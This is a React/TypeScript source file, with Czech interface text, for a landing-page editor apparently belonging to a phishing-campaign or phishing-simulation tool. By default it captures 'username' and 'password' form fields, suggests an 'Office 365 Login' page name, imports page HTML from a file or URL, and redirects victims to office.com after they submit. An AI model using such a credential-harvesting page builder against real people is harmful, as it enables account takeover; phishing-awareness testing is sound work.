// src/pages/LandingPageEditor.tsx
import React, { useState, useRef, useEffect } from 'react';
import { Link, useNavigate, useParams } from 'react-router-dom';
import { Save, ArrowLeft, Upload, Globe, Code, Eye, AlertCircle } from 'lucide-react';
import MonacoEditor from 'react-monaco-editor';
import LandingPageImporter from '../components/LandingPageImporter';
import LandingPagePreview from '../components/LandingPagePreview';

interface LandingPageData {
  name: string;
  html: string;
  css: string;
  captureData: boolean;
  captureFields: string[];
  redirectUrl: string;
  status: 'active' | 'draft';
}

const LandingPageEditor = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const fileInputRef = useRef<HTMLInputElement>(null);
  const urlInputRef = useRef<HTMLInputElement>(null);

  const [loading, setLoading] = useState(true);
  const [page, setPage] = useState<LandingPageData>({
    name: '',
    html: '',
    css: '',
    captureData: true,
    captureFields: ['username', 'password'],
    redirectUrl: 'https://office.com',
    status: 'draft'
  });

  // Načtení existující stránky při editaci
  useEffect(() => {
    const loadPage = async () => {
      if (!id) {
        setLoading(false);
        return;
      }

      try {
        const response = await fetch(`http://localhost:3001/api/landing-pages/${id}`);
        if (!response.ok) {
          throw new Error('Stránka nenalezena');
        }

        const data = await response.json();
        setPage(data);
      } catch (error) {
        console.error('Error loading landing page:', error);
        alert('Chyba při načítání stránky');
        navigate('/landing-pages');
      } finally {
        setLoading(false);
      }
    };

    loadPage();
  }, [id, navigate]);

  const [activeTab, setActiveTab] = useState<'html' | 'css'>('html');
  const [importMethod, setImportMethod] = useState<'file' | 'url' | null>(null);
  const [previewMode, setPreviewMode] = useState(false);
  const [isImportDialogOpen, setIsImportDialogOpen] = useState(false);

  const handleSave = async () => {
    if (!page.name) {
      alert('Prosím vyplňte název stránky');
      return;
    }

    try {
      // Logování pro debugging
      console.log('Saving page:', page);
      console.log('API URL:', `http://localhost:3001/api/landing-pages${id ? `/${id}` : ''}`);

      const response = await fetch(`http://localhost:3001/api/landing-pages${id ? `/${id}` : ''}`, {
        method: id ? 'PUT' : 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(page)
      });

      // Logování response
      console.log('Response status:', response.status);
      const responseData = await response.json();
      console.log('Response data:', responseData);

      if (!response.ok) {
        throw new Error(responseData.error || 'Network response was not ok');
      }

      alert('Stránka byla úspěšně uložena');
      navigate('/landing-pages');
    } catch (error) {
      console.error('Error saving landing page:', error);
      alert(`Chyba při ukládání stránky: ${error instanceof Error ? error.message : 'Neznámá chyba'}`);
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="text-lg">Načítám...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
        <div className="flex items-center mb-6">
          <Link to="/landing-pages" className="mr-4">
            <ArrowLeft className="w-6 h-6" />
          </Link>
          <h1 className="text-2xl font-bold">
            {id ? 'Upravit landing page' : 'Nová landing page'}
          </h1>
        </div>

        <div className="bg-white shadow-sm rounded-lg">
          {/* Základní informace */}
          <div className="p-6 border-b">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium mb-2">Název stránky</label>
                <input
                  type="text"
                  className="w-full p-2 border rounded focus:ring-2 focus:ring-blue-500"
                  value={page.name}
                  onChange={(e) => setPage({...page, name: e.target.value})}
                  placeholder="např. Office 365 Login"
                />
              </div>
              <div>
                <label className="block text-sm font-medium mb-2">Přesměrování po odeslání</label>
                <input
                  type="text"
                  className="w-full p-2 border rounded focus:ring-2 focus:ring-blue-500"
                  value={page.redirectUrl}
                  onChange={(e) => setPage({...page, redirectUrl: e.target.value})}
                  placeholder="https://example.com"
                />
              </div>
            </div>
          </div>

          {/* Editor */}
          <div className="p-6 border-b">
            <div className="flex justify-between items-center mb-4">
              <div className="flex space-x-2">
                <button
                  onClick={() => setActiveTab('html')}
                  className={`px-4 py-2 rounded ${
                    activeTab === 'html' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  HTML
                </button>
                <button
                  onClick={() => setActiveTab('css')}
                  className={`px-4 py-2 rounded ${
                    activeTab === 'css' ? 'bg-blue-500 text-white' : 'bg-gray-100'
                  }`}
                >
                  CSS
                </button>
                <button
                  onClick={() => setIsImportDialogOpen(true)}
                  className="px-4 py-2 bg-gray-100 text-gray-700 rounded hover:bg-gray-200 flex items-center"
                >
                  <Upload className="w-4 h-4 mr-2" />
                  Importovat
                </button>
              </div>
              <button
                onClick={() => setPreviewMode(!previewMode)}
                className="flex items-center px-4 py-2 text-gray-600 hover:text-gray-800"
              >
                <Eye className="w-4 h-4 mr-2" />
                {previewMode ? 'Skrýt náhled' : 'Zobrazit náhled'}
              </button>
            </div>

            <div className="border rounded-lg">
              <div className="h-96">
                <MonacoEditor
                  language={activeTab === 'html' ? 'html' : 'css'}
                  theme="vs-light"
                  value={activeTab === 'html' ? page.html : page.css}
                  onChange={(value) => setPage({
                    ...page,
                    [activeTab]: value
                  })}
                  options={{
                    minimap: { enabled: false },
                    scrollBeyondLastLine: false,
                    fontSize: 14,
                    wordWrap: 'on',
                    formatOnPaste: true,
                    formatOnType: true,
                    folding: true,
                    renderWhitespace: 'selection',
                    suggestOnTriggerCharacters: true,
                    tabSize: 2,
                    autoClosingBrackets: 'always',
                    autoClosingQuotes: 'always',
                    autoIndent: 'full',
                    contextmenu: true,
                    // HTML specifické nastavení
                    ...(activeTab === 'html' ? {
                      autoClosingTags: true,
                      'editor.suggest.showClasses': true,
                      'editor.suggest.showAttributes': true,
                      'editor.suggest.showElements': true,
                    } : {}),
                    // CSS specifické nastavení
                    ...(activeTab === 'css' ? {
                      colorDecorators: true,
                      suggestOnTriggerCharacters: true,
                    } : {})
                  }}
                />
              </div>
            </div>
          </div>

          {/* Zachytávání dat */}
          <div className="p-6 border-b">
            <div className="flex items-center justify-between">
              <div>
                <h2 className="text-lg font-medium">Zachytávání dat</h2>
                <p className="text-sm text-gray-500">
                  Nastavte, která data chcete z formulářů zachytávat
                </p>
              </div>
              <div className="flex items-center">
                <input
                  type="checkbox"
                  checked={page.captureData}
                  onChange={(e) => setPage({...page, captureData: e.target.checked})}
                  className="mr-2"
                />
                <span className="text-sm font-medium">Povolit zachytávání dat</span>
              </div>
            </div>

            {page.captureData && (
              <div className="mt-4">
                <div className="flex flex-wrap gap-2">
                  {page.captureFields.map((field, index) => (
                    <span
                      key={index}
                      className="inline-flex items-center px-3 py-1 rounded-full text-sm bg-blue-100 text-blue-800"
                    >
                      {field}
                      <button
                        onClick={() => {
                          const newFields = page.captureFields.filter((_, i) => i !== index);
                          setPage({...page, captureFields: newFields});
                        }}
                        className="ml-2 text-blue-600 hover:text-blue-800"
                      >
                        ×
                      </button>
                    </span>
                  ))}
                  <button
                    onClick={() => {
                      const field = prompt('Zadejte název pole pro zachytávání:');
                      if (field && !page.captureFields.includes(field)) {
                        setPage({
                          ...page,
                          captureFields: [...page.captureFields, field]
                        });
                      }
                    }}
                    className="px-3 py-1 text-sm text-blue-600 hover:text-blue-800"
                  >
                    + Přidat pole
                  </button>
                </div>
              </div>
            )}
          </div>

          {/* Footer s tlačítky */}
          <div className="p-6 flex justify-between items-center">
            <div className="flex items-center">
              <AlertCircle className="w-5 h-5 text-yellow-500 mr-2" />
              <span className="text-sm text-gray-600">
                Nezapomeňte otestovat stránku před aktivací
              </span>
            </div>
            <div className="flex space-x-4">
              <select
                value={page.status}
                onChange={(e) => setPage({...page, status: e.target.value as 'active' | 'draft'})}
                className="px-4 py-2 border rounded"
              >
                <option value="draft">Koncept</option>
                <option value="active">Aktivní</option>
              </select>
              <button
                onClick={handleSave}
                className="flex items-center px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
              >
                <Save className="w-4 h-4 mr-2" />
                Uložit
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Import Dialog */}
      <LandingPageImporter
        isOpen={isImportDialogOpen}
        onClose={() => setIsImportDialogOpen(false)}
        onImport={(content) => {
          setPage({
            ...page,
            html: content.html,
            css: content.css
          });
        }}
      />

      {/* Preview Dialog */}
      <LandingPagePreview
        isOpen={previewMode}
        onClose={() => setPreviewMode(false)}
        html={page.html}
        css={page.css}
      />
    </div>
  );
};

export default LandingPageEditor;